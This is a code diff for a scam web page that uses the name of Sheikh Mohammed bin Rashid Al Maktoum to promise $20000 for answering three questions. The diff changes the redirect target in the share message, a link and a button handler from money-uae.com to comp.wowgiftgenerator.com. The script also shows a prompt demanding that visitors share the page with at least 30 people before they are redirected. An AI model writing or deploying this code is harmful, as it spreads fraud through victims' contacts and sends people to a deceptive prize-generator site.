@@ -1,5 +1,5 @@
 
-var texts = ["Sheikh Mohammed Bin Rashid Al Maktoum Competition, answer the questions and win $ 20000 from Sheikh Mohammed bin Rashid Al Maktoum .. ((Answer on 3 Questions)) Join now The number of winners is limited  --> https://www.money-uae.com"];
+var texts = ["Sheikh Mohammed Bin Rashid Al Maktoum Competition, answer the questions and win $ 20000 from Sheikh Mohammed bin Rashid Al Maktoum .. ((Answer on 3 Questions)) Join now The number of winners is limited  --> https://comp.wowgiftgenerator.com/en.html"];
 
 
 
@@ -286,14 +286,14 @@ $(document).ready(function () {
 			if (c > 1) {
 				$(this)
 					.attr({
-						href: "https://www.money-uae.com",
+						href: "https://comp.wowgiftgenerator.com/en.html",
 						target: "_self"
 					});
 			}
 		});
 	$("#b2")
 		.on('click', function () {
-			if (c > 1) window.location = "https://www.money-uae.com";
+			if (c > 1) window.location = "https://comp.wowgiftgenerator.com/en.html";
 			else window.alert("Please send to at least 30 people to ensure a profit ! \n\n Number of shares you have made " + c);
 		});
 });
